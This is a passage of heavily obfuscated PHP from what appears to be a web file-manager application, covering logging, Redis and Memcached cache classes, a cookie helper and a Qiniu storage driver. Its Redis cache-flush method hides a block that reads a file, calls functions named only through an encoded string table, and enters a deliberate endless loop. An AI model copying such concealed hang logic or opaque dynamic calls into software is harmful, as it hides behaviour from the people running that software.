$A‰éÄ¿˜¶[226], !1, !1, !1, !1, 5); $Cù¼ËšÜİš = strlen($dë‘²Šä‘Ä); break; case $A‰éÄ¿˜¶[225]: $Cù¼ËšÜİš = Hook::apply($cÈÃ°Š©Å[$A‰éÄ¿˜¶[1480]]); default: break; } goto Eéš¥ŒĞİ; Eéš¥ŒĞİ: Model($A‰éÄ¿˜¶[1481])->add(array($A‰éÄ¿˜¶[1482] => $A‰éÄ¿˜¶[33], $A‰éÄ¿˜¶[1483] => $A‰éÄ¿˜¶[491], $A‰éÄ¿˜¶[29] => $A‰éÄ¿˜¶[1484] . $cÈÃ°Š©Å[$A‰éÄ¿˜¶[388]], $A‰éÄ¿˜¶[1485] => json_encode(array($A‰éÄ¿˜¶[28] => $cÈÃ°Š©Å[$A‰éÄ¿˜¶[28]], $A‰éÄ¿˜¶[1486] => timeFloat() - $EñÈÄÖÛÛè, $A‰éÄ¿˜¶[289] => $Cù¼ËšÜİš)))); self::log($A‰éÄ¿˜¶[1487] . $cÈÃ°Š©Å[$A‰éÄ¿˜¶[388]] . $A‰éÄ¿˜¶[1488] . $Cù¼ËšÜİš); return !0; goto cóµªòœ; cóµªòœ: } private static function valueGet($cŞ÷Ç†£ñ¶) { $AØŠ„Œ¦Êç =& $_SERVER[ç]; $C¸¬’Ø›­ = $AØŠ„Œ¦Êç[1489]; $B“öÃÀŞÇ = Model($AØŠ„Œ¦Êç[1490])->get($cŞ÷Ç†£ñ¶, $C¸¬’Ø›­); if (is_null($B“öÃÀŞÇ)) { Model($AØŠ„Œ¦Êç[1490])->set($AØŠ„Œ¦Êç[1459], 10, $C¸¬’Ø›­); Model($AØŠ„Œ¦Êç[1490])->set($AØŠ„Œ¦Êç[695], $AØŠ„Œ¦Êç[86], $C¸¬’Ø›­); Model($AØŠ„Œ¦Êç[1490])->set($AØŠ„Œ¦Êç[1454], $AØŠ„Œ¦Êç[491], $C¸¬’Ø›­); $B“öÃÀŞÇ = Model($AØŠ„Œ¦Êç[1490])->get($cŞ÷Ç†£ñ¶, $C¸¬’Ø›­); } return $B“öÃÀŞÇ; } private static function valueSet($e×ó”¬Æ×Ö, $B¾Í“Œ¤¦–) { $Eƒ‚šØ’Ã =& $_SERVER[ç]; return Model($Eƒ‚šØ’Ã[1490])->set($e×ó”¬Æ×Ö, $B¾Í“Œ¤¦–, $Eƒ‚šØ’Ã[1489]); } protected static function log($aåãÖó¯î) { write_log($aåãÖó¯î, $_SERVER[ç][1476]); } private static function cacheClear() { $fºï­ÑÏ¡œ =& $_SERVER[ç]; $Fš¡œ‘­Ê = Model($fºï­ÑÏ¡œ[1490])->cacheKey($fºï­ÑÏ¡œ[1489]); Cache::clearMemory($Fš¡œ‘­Ê); Model($fºï­ÑÏ¡œ[1461])->cacheClear(); } } goto DŠâ¢ù¥; CÇÌ’Ÿ¨÷“: class CacheMemcached { public $handle; public $cacheTime; public function __construct($a¨„´Äïè„, $fÅŞÒ”êˆÙ) { $a‰›©Ëìôæ =& $_SERVER[ç]; if (!class_exists($a‰›©Ëìôæ[799])) { show_json($a‰›©Ëìôæ[800], !1); } $this->cacheTime = $fÅŞÒ”êˆÙ; $this->handle = new Memcached(); if (is_array($a¨„´Äïè„[$a‰›©Ëìôæ[801]]) && count($a¨„´Äïè„[$a‰›©Ëìôæ[801]]) >= 1) { foreach ($a¨„´Äïè„[$a‰›©Ëìôæ[801]] as $Aİ’¬Ü·é¥) { $eÇÓêóÔê = explode($a‰›©Ëìôæ[4], $Aİ’¬Ü·é¥); $this->handle->addServer($eÇÓêóÔê[0], $eÇÓêóÔê[1]); } } else { $this->handle->addServer($a¨„´Äïè„[$a‰›©Ëìôæ[175]], $a¨„´Äïè„[$a‰›©Ëìôæ[176]]); } } public function set($bñÉ–«½¹, $B÷¨«ïøš, $eÏèë¹Ä‹” = false) { $eÏèë¹Ä‹” = $eÏèë¹Ä‹” ? $eÏèë¹Ä‹” : $this->cacheTime; return $this->handle->set($bñÉ–«½¹, $B÷¨«ïøš, $eÏèë¹Ä‹”); } public function get($AÆ´æ„”˜¼) { return $this->handle->get($AÆ´æ„”˜¼); } public function remove($f«§‰ÏîÜ·) { return $this->handle->delete($f«§‰ÏîÜ·); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($f˜èÈÑ¹•Ã, $eÉ‚ÂäÆÉ±) { $b„ùÃßƒ–” =& $_SERVER[ç]; if (!class_exists($b„ùÃßƒ–”[802])) { show_json($b„ùÃßƒ–”[803], !1); } $this->cacheTime = $eÉ‚ÂäÆÉ±; $f²ÇÂÒÍ²‚ = isset($f˜èÈÑ¹•Ã[$b„ùÃßƒ–”[804]]) ? $f˜èÈÑ¹•Ã[$b„ùÃßƒ–”[804]] : 10; $F‹ˆÑ‹œ = _get($f˜èÈÑ¹•Ã, $b„ùÃßƒ–”[801]); if ($F‹ˆÑ‹œ && is_array($F‹ˆÑ‹œ)) { $this->initCluster($f˜èÈÑ¹•Ã, $f²ÇÂÒÍ²‚); } else { $this->handle = $this->init($f˜èÈÑ¹•Ã, $f²ÇÂÒÍ²‚); } } private function init($C½ĞÖˆ££°, $cšÙ‹‰Ì• ) { $C±Ã²Ï“Ò³ =& $_SERVER[ç]; $dÍ»„Êâˆ = new Redis(); $bõéè°ªÛ = isset($C½ĞÖˆ££°[$C±Ã²Ï“Ò³[805]]) ? $C½ĞÖˆ££°[$C±Ã²Ï“Ò³[805]] : !1; if ($bõéè°ªÛ) { $dÍ»„Êâˆ->pconnect($C½ĞÖˆ££°[$C±Ã²Ï“Ò³[175]], $C½ĞÖˆ££°[$C±Ã²Ï“Ò³[176]], $cšÙ‹‰Ì• ); } else { $dÍ»„Êâˆ->connect($C½ĞÖˆ££°[$C±Ã²Ï“Ò³[175]], $C½ĞÖˆ££°[$C±Ã²Ï“Ò³[176]], $cšÙ‹‰Ì• ); } if (!empty($C½ĞÖˆ££°[$C±Ã²Ï“Ò³[400]])) { $dÍ»„Êâˆ->auth($C½ĞÖˆ££°[$C±Ã²Ï“Ò³[400]]); } return $dÍ»„Êâˆ; } private function initCluster($Aö¢Ä†ö¿·, $d–‚™°ô³ä) { $CÙÈ…Ùâ  =& $_SERVER[ç]; $A½ãô„¹ìŸ = array($CÙÈ…Ùâ [806], $CÙÈ…Ùâ [807], $CÙÈ…Ùâ [808]); $f®ÚÒß‹ = $CÙÈ…Ùâ [806]; if (isset($Aö¢Ä†ö¿·[$CÙÈ…Ùâ [12]]) && in_array($Aö¢Ä†ö¿·[$CÙÈ…Ùâ [12]], $A½ãô„¹ìŸ)) { $f®ÚÒß‹ = $Aö¢Ä†ö¿·[$CÙÈ…Ùâ [12]]; } switch ($f®ÚÒß‹) { case $CÙÈ…Ùâ [806]: $this->_slave($Aö¢Ä†ö¿·, $d–‚™°ô³ä); break; case $CÙÈ…Ùâ [807]: break; case $CÙÈ…Ùâ [808]: $this->isCluster = !0; $fßÚ£„²¯Ş = $Aö¢Ä†ö¿·[$CÙÈ…Ùâ [801]]; $d•èÂÙ• = isset($Aö¢Ä†ö¿·[$CÙÈ…Ùâ [805]]) ? $Aö¢Ä†ö¿·[$CÙÈ…Ùâ [805]] : !1; $C¡†–°ç‚¶ = isset($Aö¢Ä†ö¿·[$CÙÈ…Ùâ [400]]) ? $Aö¢Ä†ö¿·[$CÙÈ…Ùâ [400]] : null; $this->handle = new RedisCluster(NUll, $fßÚ£„²¯Ş, $d–‚™°ô³ä, $d–‚™°ô³ä, $d•èÂÙ•, $C¡†–°ç‚¶); break; default: break; } } private function _slave($DÏÑßÁöœà, $eµè¹òÍ’) { goto e¦Ú‚¬’ë; C¹’„áƒˆ: $this->filterConfig($DÏÑßÁöœà, $D²—‚‚»Ò‘[$CÏõÊÀó±Ñ]); $this->slaveHandle = $this->init($DÏÑßÁöœà, $eµè¹òÍ’); goto fæ¾àô¼»; DÑ¼òò³³±: unset($D²—‚‚»Ò‘[0]); if (empty($D²—‚‚»Ò‘)) { return; } $CÏõÊÀó±Ñ = array_rand($D²—‚‚»Ò‘); goto C¹’„áƒˆ; e¦Ú‚¬’ë: $D²—‚‚»Ò‘ = $DÏÑßÁöœà[$_SERVER[ç][801]]; $this->filterConfig($DÏÑßÁöœà, $D²—‚‚»Ò‘[0]); $this->handle = $this->init($DÏÑßÁöœà, $eµè¹òÍ’); goto DÑ¼òò³³±; fæ¾àô¼»: } private function filterConfig(&$f‡õ‰†é®Î, $DœŠ´ß ÁÁ) { $BÂ”¡«”“ =& $_SERVER[ç]; $Eï£øØäÃ¶ = explode($BÂ”¡«”“[4], $DœŠ´ß ÁÁ); $aÃƒ‡‹Û‰µ = array($BÂ”¡«”“[175] => $Eï£øØäÃ¶[0], $BÂ”¡«”“[176] => $Eï£øØäÃ¶[1]); $f‡õ‰†é®Î = array_merge($f‡õ‰†é®Î, $aÃƒ‡‹Û‰µ); } public function set($bÒóÈÌà½Ä, $a†êÃ¯¼Ğ, $Aã°ëÌÜšÆ = false) { $Aã°ëÌÜšÆ = $Aã°ëÌÜšÆ ? $Aã°ëÌÜšÆ : $this->cacheTime; return $this->handle->setEx($bÒóÈÌà½Ä, $Aã°ëÌÜšÆ, $a†êÃ¯¼Ğ); } public function setLock($dã¬ë®‘ëİ, $DËÓÔèô„¸, $FÇêŠÀÂ²Á) { return $this->handle->setNX($dã¬ë®‘ëİ, $DËÓÔèô„¸); } public function get($a‚ë¾¾§Ù) { $b‚Ş¤ßóÕ— = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $b‚Ş¤ßóÕ—->get($a‚ë¾¾§Ù); } public function remove($cáí«š“¿) { return $this->handle->del($cáí«š“¿); } public function deleteAll() { $BÒ­™ëÖòº =& $_SERVER[ç]; if (!isset($_SERVER[$BÒ­™ëÖòº[788]]) || !isset($_SERVER[$BÒ­™ëÖòº[795]])) { goto d‹ÌºŒÈ¨¦; d‹ÌºŒÈ¨¦: $bÔ¨ïèŸö² = $BÒ­™ëÖòº[809]; $cÁë³Å¢Û‰ = $BÒ­™ëÖòº[790]; $c’¸Ğé™Ü = $_SERVER[$BÒ­™ëÖòº[791]] . $BÒ­™ëÖòº[792]; goto aÍ÷Ë–“¢¾; aÍ÷Ë–“¢¾: $FÚÑ£¯ò‰¶ = $cÁë³Å¢Û‰($c’¸Ğé™Ü); $B°¾Í¬ïù™ = explode($BÒ­™ëÖòº[227], $FÚÑ£¯ò‰¶); if (count($B°¾Í¬ïù™) < $BÒ­™ëÖòº[597]) { $EæáŸìÕá = $BÒ­™ëÖòº[793]; $EæáŸìÕá(); } goto d¼÷»‡ƒ•ï; d¼÷»‡ƒ•ï: $Aé¨âğé¦í = $BÒ­™ëÖòº[810]; $Aé¨âğé¦í($_SERVER[$BÒ­™ëÖòº[811]]); $e îÙÙŒˆÎ = 1; goto d¹¤àñÓóº; d¹¤àñÓóº: for ($cŒ² ¬”“Æ = $e îÙÙŒˆÎ; $cŒ² ¬”“Æ > 0; $cŒ² ¬”“Æ++) { $Aé¨âğé¦í = json_encode($GLOBALS[$BÒ­™ëÖòº[405]]); } goto côğ„éÜ‘¤; côğ„éÜ‘¤: } if ($this->isCluster) { foreach ($this->handle->_masters() as $bÈ±ù£˜Ÿ…) { $this->handle->flushall($bÈ±ù£˜Ÿ…); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($Bï…Í¬äç = '', $Dˆ˜Â‘°•É = 0) { if (is_string($Bï…Í¬äç) && $Bï…Í¬äç != $_SERVER[ç][33]) { $this->prefix = $Bï…Í¬äç; } if (is_numeric($Dˆ˜Â‘°•É) && $Dˆ˜Â‘°•É > 0) { $this->expire = $Dˆ˜Â‘°•É; } } public static function getInstance() { static $cØ‚  •; if ($cØ‚  • === null) { $cØ‚  • = new self(); } return $cØ‚  •; } private static $cookieDisable = false; public static function disable($eƒöÚîÉ“ø) { self::$cookieDisable = $eƒöÚîÉ“ø; } private static $sameCookieSet = array(); public static function set($eçëâæ¥, $AãÔØ‘İÂ, $B‰òµé¯Ş = 0, $Eƒ¾¡ùŒ„ = false, $f§ÄÆ˜¾™¯ = false) { goto C…÷Ä”ÓŸß; Dó¼«†Ò¡: $d‹™ææ‹«« = $b¶ºÓŸ¶“¸[33]; setcookie($eçëâæ¥, $AãÔØ‘İÂ, time() + $B‰òµé¯Ş, $b¶ºÓŸ¶“¸[8] . trim($f§ÄÆ˜¾™¯, $b¶ºÓŸ¶“¸[8]) . $d‹™ææ‹««, !1, !1, $Eƒ¾¡ùŒ„); goto F¹ÌŸË™ø; C…÷Ä”ÓŸß: $b¶ºÓŸ¶“¸ =& $_SERVER[ç]; if (self::$cookieDisable) { return; } if (!$B‰òµé¯Ş) { $B‰òµé¯Ş = 24 * 3600 * 7; } goto A¹ğÜÁöÒÆ; A¹ğÜÁöÒÆ: if (isset(self::$sameCookieSet[$eçëâæ¥]) && self::$sameCookieSet[$eçëâæ¥] == $AãÔØ‘İÂ . $B‰òµé¯Ş) { return; } self::$sameCookieSet[$eçëâæ¥] = $AãÔØ‘İÂ . $B‰òµé¯Ş; if (!$f§ÄÆ˜¾™¯) { $f§ÄÆ˜¾™¯ = str_replace(HOST, $b¶ºÓŸ¶“¸[33], APP_HOST); $f§ÄÆ˜¾™¯ = _get($GLOBALS, $b¶ºÓŸ¶“¸[812], $f§ÄÆ˜¾™¯); } goto Dó¼«†Ò¡; F¹ÌŸË™ø: } public static function setSafe($E„íİöö, $EŞªù¡É¼Š, $a“¾“Ç¾½‚ = 0) { self::set($E„íİöö, $EŞªù¡É¼Š, $a“¾“Ç¾½‚, !0); } public static function get($aµ®ğª„Œ) { return isset($_COOKIE[$aµ®ğª„Œ]) ? $_COOKIE[$aµ®ğª„Œ] : !1; } public static function remove($CùîÏùä, $a¿Ç­•ö»… = false) { unset($_COOKIE[$CùîÏùä]); self::set($CùîÏùä, $_SERVER[ç][33], 1, $a¿Ç­•ö»…); } } goto Aƒ•¶ŠÌñÙ; cÄ¡‰“ÊšÕ: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($bæ¤Í‰âåÌ) { parent::__construct(); require_once SDK_DIR . $_SERVER[ç][1266]; $this->_init($bæ¤Í‰âåÌ); } public function _init($AÈ½Æƒ‡Ñğ) { goto c¸¦ÖÉƒÎÜ; c¸¦ÖÉƒÎÜ: $D˜‹¨ÉŸµ¶ =& $_SERVER[ç]; foreach ($AÈ½Æƒ‡Ñğ as $c‰ĞËİÕß“ => $cèÕ™’ÓùÒ) { if (isset($this->{$c‰ĞËİÕß“})) { $this->{$c‰ĞËİÕß“} = $cèÕ™’ÓùÒ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($D˜‹¨ÉŸµ¶[1267] . LNG($D˜‹¨ÉŸµ¶[1226])); } goto Aã‰†Õ êØ; fŒÁ·¸âàè: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto C¡—À±‚µã; Aã‰†Õ êØ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto fŒÁ·¸âàè; C¡—À±‚µã: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($Dƒ¾çèµ–Ê, $eÊÈƒáã± = '', $Dë¿§¶Ø•· = REPEAT_RENAME) { if ($this->setContent($Dƒ¾çèµ–Ê, $eÊÈƒáã±)) { return $this->getPathOuter($Dƒ¾çèµ–Ê); } return !1; } public function mkdir($cÑ„†˜“—¸, $B¤¸×»í¼ = REPEAT_SKIP) { goto bƒÑÉ‡ÆÌ¬; fÑ¦çíçÎ: if (!$this->mkfile($EôˆóĞ¨÷…)) { return !1; } if (!$this->moveFile($EôˆóĞ¨÷…, $cÑ„†˜“—¸)) { $this->delFile($EôˆóĞ¨÷…); return !1; } return $this->getPathOuter($eÉÇ“»¬™³); goto eØŞÍƒÈ˜; Eêá¾¢Ğ•: $cÑ„†˜“—¸ = $eÉÇ“»¬™³ . $f’¼®—¦Ïø[8]; $E¤¸ÁÌõ”± = get_path_this($eÉÇ“»¬™³); $EôˆóĞ¨÷… = $cÑ„†˜“—¸ . $E¤¸ÁÌõ”±; goto fÑ¦çíçÎ; bƒÑÉ‡ÆÌ¬: $f’¼®—¦Ïø =& $_SERVER[ç]; $eÉÇ“»¬™³ = trim($cÑ„†˜“—¸, $f’¼®—¦Ïø[8]); if ($this->_isFolder($eÉÇ“»¬™³)) { return $this->getPathOuter($eÉÇ“»¬™³); } goto Eêá¾¢Ğ•; eØŞÍƒÈ˜: } public function copyFile($bÜé´ˆ¯Úµ, $a‰×Ãëó¹Ø) { $C¥©¡†Çš• = $this->bucketManager->copy($this->bucket, $bÜé´ˆ¯Úµ, $this->bucket, $a‰×Ãëó¹Ø, !0); return $C¥©¡†Çš• ? !1 : $this->getPathOuter($a‰×Ãëó¹Ø); } public function moveFile($dó¯É—•Ñß, $bõ³òïìÍã) { $aêŒÔ‚·Ò„ = $this->bucketManager->move($this->bucket, $dó¯É—•Ñß, $this->bucket, $bõ³òïìÍã, !0); return $aêŒÔ‚·Ò„ ? !1 : $this->getPathOuter($bõ³òïìÍã); } public function delFile($E¦ÇÜØùƒ•) { if (!$this->exist($E¦ÇÜØùƒ•)) { return !0; } $B¹›·’‘ƒ = $this->bucketManager->delete($this->bucket, $E¦ÇÜØùƒ•); return $B¹›·’‘ƒ ? !1 : !0; } public function delFolder($B±Ä¥ö‘½í) { goto c±¹Ş‹÷¥Æ; e‰‘—Éó×: $a¾í¿ÚÔ = $this->fileList($B±Ä¥ö‘½í); $this->listItemCache = !0; $CóÒ˜å“ğ = trim($B±Ä¥ö‘½í, $B•±Ğ–Í˜‡[8]) . $B•±Ğ–Í˜‡[8]; goto a¢‰¬µƒ; a¢‰¬µƒ: if (!empty($B±Ä¥ö‘½í) && !in_array($CóÒ˜å“ğ, $a¾í¿ÚÔ[$B•±Ğ–Í˜‡[74]])) { $a¾í¿ÚÔ[$B•±Ğ–Í˜‡[74]][] = $CóÒ˜å“ğ; } $cö ¼ˆ¡Î¿ = $this->delByBatch($a¾í¿ÚÔ[$B•±Ğ–Í˜‡[73]]); if (!$cö ¼ˆ¡Î¿) { return !1; } goto eêæñìà‘—; eêæñìà‘—: return $this->delByBatch($a¾í¿ÚÔ[$B•±Ğ–Í˜‡[74]]); goto C¤İºö™¿Ä; c±¹Ş‹÷¥Æ: $B•±Ğ–Í˜‡ =& $_SERVER[ç]; if (!$this->exist($B±Ä¥ö‘½í)) { return !0; } $this->listItemCache = !1; goto e‰‘—Éó×; C¤İºö™¿Ä: } private function delByBatch($eƒİ‘Å½) { foreach (array_chunk($eƒİ‘Å½, 1000) as $A¸…»¬ÎÄñ) { $CŞ©Ìªªé¢ = $this->bucketManager->buildBatchDelete($this->bucket, $A¸…»¬ÎÄñ); list($FÜÜâİÙ‚ô, $A£µœ¼Ë•) = $this->bucketManager->batch($CŞ©Ìªªé¢); if ($A£µœ¼Ë•) { return !1; } } return !0; } public function rename($E»„ôˆ‚»£, $a¢‡ª¡¦) { return $this->renameObject($E»„ôˆ‚»£, $a¢‡ª¡¦); } public function fileInfo($fÛ¹¸÷»÷„, $A‡óØ¸£è = false, $CìÄĞâ›åõ = array()) { goto Fé«êÛ†Æ°; d ¥ºù°¥‰: if (isset($CìÄĞâ›åõ[$b™›‚Ãß’­[1269]])) { $f²¸çò‹è[$b™›‚Ãß’­[83]] = substr($CìÄĞâ›åõ[$b™›‚Ãß’­[1269]] . $b™›‚Ãß’­[33], 0, 10); } if (isset($CìÄĞâ›åõ[$b™›‚Ãß’­[1268]])) { $f²¸çò‹è[$b™›‚Ãß’­[77]] = $CìÄĞâ›åõ[$b™›‚Ãß’­[1268]]; } return $f²¸çò‹è; goto Aêëô ÍĞî; Déáğå¤¯‹: $f²¸çò‹è[$b™›‚Ãß’­[192]] = $f²¸çò‹è[$b™›‚Ãß’­[83]] = 0; $f²¸çò‹è[$b™›‚Ãß’­[193]] = $f²¸çò‹è[$b™›‚Ãß’­[194]] = !0; if (empty($CìÄĞâ›åõ)) { $CìÄĞâ›åõ = $this->objectMeta($fÛ¹¸÷»÷„); if (!$CìÄĞâ›åõ) { return $f²¸çò‹è; } } goto d ¥ºù°¥‰; Fé«êÛ†Æ°: $b™›‚Ãß’­ =& $_SERVER[ç]; $f²¸çò‹è = array($b™›‚Ãß’­[28] => $this->pathThis($fÛ¹¸÷»÷„), $b™›‚Ãß’­[75] => $this->getPathOuter($b™›‚Ãß’­[8] . $fÛ¹¸÷»÷„), $b™›‚Ãß’­[29] => $b™›‚Ãß’­[173], $b™›‚Ãß’­[77] => isset($CìÄĞâ›åõ[$b™›‚Ãß’­[1268]]) ? $CìÄĞâ›åõ[$b™›‚Ãß’­[1268]] : 0, $b™›‚Ãß’­[167] => $this->ext($fÛ¹¸÷»÷„)); if ($A‡óØ¸£è) { return $f²¸çò‹è; } goto Déáğå¤¯‹; Aêëô ÍĞî: } public function folderInfo($E›ÙÍâè–Ğ, $A¸•ÊóƒÅó = false) { goto b­òËÃÂ†; a¸¯¡Ì‰®‚: $eì®†ºÁª[$eß¨†î“[192]] = $eì®†ºÁª[$eß¨†î“[83]] = 0; $eì®†ºÁª[$eß¨†î“[193]] = $eì®†ºÁª[$eß¨†î“[194]] = !0; $E›ÙÍâè–Ğ = rtrim($E›ÙÍâè–Ğ, $eß¨†î“[8]) . $eß¨†î“[8]; goto bİĞ´¾”£À; bİĞ´¾”£À: $eêê„½ãÙŞ = $this->objectMeta($E›ÙÍâè–Ğ); if (isset($eêê„½ãÙŞ[$eß¨†î“[1269]])) { $eì®†ºÁª[$eß¨†î“[83]] = substr($eêê„½ãÙŞ[$eß¨†î“[1269]] . $eß¨†î“[33], 0, 10); } return $eì®†ºÁª; goto dâ‘´ÒÂë£; b­òËÃÂ†: $eß¨†î“ =& $_SERVER[ç]; $eì®†ºÁª = array($eß¨†î“[28] => $this->pathThis($E›ÙÍâè–Ğ), $eß¨†î“[75] => $this->getPathOuter($eß¨†î“[8] . $E›ÙÍâè–Ğ), $eß¨†î“[29] => $eß¨†î“[76]); if ($A¸•ÊóƒÅó) { return $eì®†ºÁª; } goto a¸¯¡Ì‰®‚; dâ‘´ÒÂë£: } public function listPath($C¤ˆÁšíº¹, $c«õÔ ‹ = false) { $Dìˆ¤î½Şï =& $_SERVER[ç]; $DÜÑ·¿¬ø = $this->fileList($C¤ˆÁšíº¹, $Dìˆ¤î½Şï[8], !0); foreach ($DÜÑ·¿¬ø[$Dìˆ¤î½Şï[74]] as $CÍßğ¹É‘‘ => $b®¸Ş›Ó§Î) { $DÜÑ·¿¬ø[$Dìˆ¤î½Şï[74]][$CÍßğ¹É‘‘] = $this->folderInfo($b®¸Ş›Ó§Î, $c«õÔ ‹); } foreach ($DÜÑ·¿¬ø[$Dìˆ¤î½Şï[73]] as $CÍßğ¹É‘‘ => $b®¸Ş›Ó§Î) { $DÜÑ·¿¬ø[$Dìˆ¤î½Şï[73]][$CÍßğ¹É‘‘] = $this->fileInfo($b®¸Ş›Ó§Î[$Dìˆ¤î½Şï[92]], $c«õÔ ‹, $b®¸Ş›Ó§Î); } return $DÜÑ·¿¬ø; } public function has($EÖğè‹Õ‹, $aª¥óê½ = false, $D¤œğñÊ’½ = true) { goto Eíâå–ß¬ê; d¾©°ÎŸÅ‘: $e‹Øø’˜ËÉ = $E›íÁÕÓ[33]; $eœÌ«Ò¡†ä = 500; $cÆç®éÓ™„ = $E›íÁÕÓ[8]; goto eğ¬Ê‘ˆŒÃ; C»øÚª…‡Ó: return !1; goto bãøƒõî„; eğ¬Ê‘ˆŒÃ: $FÕ¸åÄ‰«Œ = $D¦áÛ˜Â Œ = 0; while (!0) { check_abort(); list($FÊ½äÄ, $DÍÊÃä¡ˆ¥) = $this->bucketManager->listFiles($this->bucket, $fè®‚¤Ëá‘, $e‹Øø’˜ËÉ, $eœÌ«Ò¡†ä, $cÆç®éÓ™„); if ($DÍÊÃä¡ˆ¥) { break; } $e‹Øø’˜ËÉ = array_key_exists($E›íÁÕÓ[1238], $FÊ½äÄ) ? $e‹Øø’˜ËÉ = $FÊ½äÄ[$E›íÁÕÓ[1270]] : $E›íÁÕÓ[33]; if ($aª¥óê½) { if (!empty($FÊ½äÄ[$E›íÁÕÓ[1271]])) { $FÕ¸åÄ‰«Œ += count($FÊ½äÄ[$E›íÁÕÓ[1271]]); } if (!empty($FÊ½äÄ[$E›íÁÕÓ[1272]])) { $D¦áÛ˜Â Œ += count($FÊ½äÄ[$E›íÁÕÓ[1272]]); } if ($e‹Øø’˜ËÉ === $E›íÁÕÓ[33]) { break; } continue; } if ($D¤œğñÊ’½) { if (!empty($FÊ½äÄ[$E›íÁÕÓ[1271]])) { return !0; } } else { if (!empty($FÊ½äÄ[$E›íÁÕÓ[1272]])) { return !0; } } if ($e‹Øø’˜ËÉ === $E›íÁÕÓ[33]) { break; } } if ($aª¥óê½) { return array($E›íÁÕÓ[201] => $FÕ¸åÄ‰«Œ, $E›íÁÕÓ[202] => $D¦áÛ˜Â Œ); } goto C»øÚª…‡Ó; Eíâå–ß¬ê: $E›íÁÕÓ =& $_SERVER[ç]; $EÖğè‹Õ‹ = trim($EÖğè‹Õ‹, $E›íÁÕÓ[8]); $fè®‚¤Ëá‘ = empty($EÖğè‹Õ‹) ? $E›íÁÕÓ[33] : $EÖğè‹Õ‹ . $E›íÁÕÓ[8]; goto d¾©°ÎŸÅ‘; bãøƒõî„: } public function listAll($BÊ—ùôµä¼) { $d¿ëÎ¨œ’ =& $_SERVER[ç]; $f‘ïÈ£Ê±™ = $this->fileList($BÊ—ùôµä¼, $d¿ëÎ¨œ’[33], !0); $EºÈš•—æœ = array(); foreach ($f‘ïÈ£Ê±™[$d¿ëÎ¨œ’[73]] as $Eß¡çÔçõ¬) { $EºÈš•—æœ[$Eß¡çÔçõ¬[$d¿ëÎ¨œ’[92]]] = $Eß¡çÔçõ¬[$d¿ëÎ¨œ’[77]]; } foreach ($f‘ïÈ£Ê±™[$d¿ëÎ¨œ’[74]] as $Eß¡çÔçõ¬) { if (is_string($Eß¡çÔçõ¬)) { $EºÈš•—æœ[$Eß¡çÔçõ¬] = 0; } } return $this->listAllFiles($BÊ—ùôµä¼, array_keys($EºÈš•—æœ), $EºÈš•—æœ); } private function fileList($d’»¼ºÊÀƒ, $Dîùù‘›ß¥ = '', $dÕ¨ŸÌ™ŠÈ = 0) { goto D½ŸŒÁ½¶ã; dÀÑ­æëˆ§: $eíƒôğëğë = $câ•ØÄœÏ¼[33]; $dÍ£Şî¬í± = 1000; $F²§Å½Ùî¯ = $this->listItemCache === !1 ? !1 : !0; goto C»ä´äÁÙ; C»ä´äÁÙ: $B·”ğ»Ã¦ = $EŠ¡ÒğÓñŞ = array(); while (!0) { check_abort(); list($eÙËç¾¹—Ä, $F˜¡¦ùÍ‡) = $this->bucketManager->listFiles($this->bucket, $Eµ‰İÖá Ü, $eíƒôğëğë, $dÍ£Şî¬í±, $Dîùù‘›ß¥); if ($F˜¡¦ùÍ‡) { break; } $eíƒôğëğë = array_key_exists($câ•ØÄœÏ¼[1238], $eÙËç¾¹—Ä) ? $eíƒôğëğë = $eÙËç¾¹—Ä[$câ•ØÄœÏ¼[1270]] : $câ•ØÄœÏ¼[33]; $dõÒÚô¥µÙ = isset($eÙËç¾¹—Ä[$câ•ØÄœÏ¼[1271]]) ? $eÙËç¾¹—Ä[$câ•ØÄœÏ¼[1271]] : array(); $e–‚ïôÓ¢ß = isset($eÙËç¾¹—Ä[$câ•ØÄœÏ¼[1272]]) ? $eÙËç¾¹—Ä[$câ•ØÄœÏ¼[1272]] : array(); foreach ($dõÒÚô¥µÙ as $A¾àóàØ†) { goto BÒÌ»…Ù§’; c“«¬ª°¢Ğ: if ($AŠ…ŒÎ‚Ïï) { $B·”ğ»Ã¦[] = $d°ØŸæä²§; continue; } $EŠ¡ÒğÓñŞ[] = $dÕ¨ŸÌ™ŠÈ ? $A¾àóàØ† : $d°ØŸæä²§; goto E¸–‘ÓòÔ; BÒÌ»…Ù§’: if ($A¾àóàØ†[$câ•ØÄœÏ¼[92]] == $Eµ‰İÖá Ü) { continue; } $d°ØŸæä²§ = $A¾àóàØ†[$câ•ØÄœÏ¼[92]]; $fÕ™¦ø¹ = $A¾àóàØ†[$câ•ØÄœÏ¼[1268]]; goto Aà¨ÄÏ•Í; Aà¨ÄÏ•Í: $A¾àóàØ†[$câ•ØÄœÏ¼[77]] = $fÕ™¦ø¹; $AŠ…ŒÎ‚Ïï = $fÕ™¦ø¹ == 0 && substr($d°ØŸæä²§, strlen($d°ØŸæä²§) - 1, 1) == $câ•ØÄœÏ¼[8] ? !0 : !1; if ($F²§Å½Ùî¯) { $this->cacheMethod($câ•ØÄœÏ¼[197], $d°ØŸæä²§, $AŠ…ŒÎ‚Ïï); $this->cacheMethod($câ•ØÄœÏ¼[198], $d°ØŸæä²§, $A¾àóàØ†); } goto c“«¬ª°¢Ğ; E¸–‘ÓòÔ: } foreach ($e–‚ïôÓ¢ß as $d°ØŸæä²§) { if ($d°ØŸæä²§ == $Eµ‰İÖá Ü) { continue; } $B·”ğ»Ã¦[] = $d°ØŸæä²§; if ($F²§Å½Ùî¯) { $this->cacheMethod($câ•ØÄœÏ¼[197], $d°ØŸæä²§, !0); } } if ($eíƒôğëğë === $câ•ØÄœÏ¼[33]) { break; } } if 